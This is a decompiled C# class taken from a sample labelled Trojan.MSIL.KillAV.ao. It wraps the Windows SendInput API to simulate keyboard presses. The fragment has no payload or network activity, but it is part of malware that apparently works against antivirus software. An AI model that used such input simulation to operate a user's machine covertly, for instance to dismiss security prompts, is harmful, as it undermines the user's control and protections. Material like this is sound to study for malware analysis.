// Decompiled with JetBrains decompiler
// Type: n.keyboard
// Assembly: yes, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 83EB8C5F-168C-47FA-93FE-E25AA6C64B02
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.KillAV.ao-c83dfee0b35be414b2ecb0a3b5fff41c790bb356c2774a2fc681a8981978b48b.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace n
{
  [StandardModule]
  public sealed class keyboard
  {
    public static void click(int i, Keys key)
    {
      keyboard.INPUT pInputs = new keyboard.INPUT();
      keyboard.KEYBDINPUT keybdinput = new keyboard.KEYBDINPUT();
      pInputs.dwType = keyboard.InputType.Keyboard;
      pInputs.ki = keybdinput;
      pInputs.ki.wVk = Convert.ToInt16((int) key);
      pInputs.ki.wScan = (short) 0;
      pInputs.ki.time = 0;
      pInputs.ki.dwFlags = (keyboard.KEYEVENTF) i;
      pInputs.ki.dwExtraInfo = IntPtr.Zero;
      int cbSize = Marshal.SizeOf(typeof (keyboard.INPUT));
      if (keyboard.SendInput(1, ref pInputs, cbSize) != 0)
        ;
    }

    [DllImport("user32.dll", SetLastError = true)]
    internal static extern int SendInput(int cInputs, ref keyboard.INPUT pInputs, int cbSize);

    [StructLayout(LayoutKind.Explicit, Size = 28, Pack = 1)]
    internal struct INPUT
    {
      [FieldOffset(0)]
      public keyboard.InputType dwType;
      [FieldOffset(4)]
      public keyboard.KEYBDINPUT ki;
      [FieldOffset(4)]
      public keyboard.HARDWAREINPUT hi;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    internal struct KEYBDINPUT
    {
      public short wVk;
      public short wScan;
      public keyboard.KEYEVENTF dwFlags;
      public int time;
      public IntPtr dwExtraInfo;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    internal struct HARDWAREINPUT
    {
      public int uMsg;
      public short wParamL;
      public short wParamH;
    }

    internal enum InputType
    {
      Mouse,
      Keyboard,
      Hardware,
    }

    [Flags]
    internal enum KEYEVENTF
    {
      EXTENDEDKEY = 1,
      KEYUP = 2,
      UNICODE = 4,
      SCANCODE = 8,
    }
  }
}
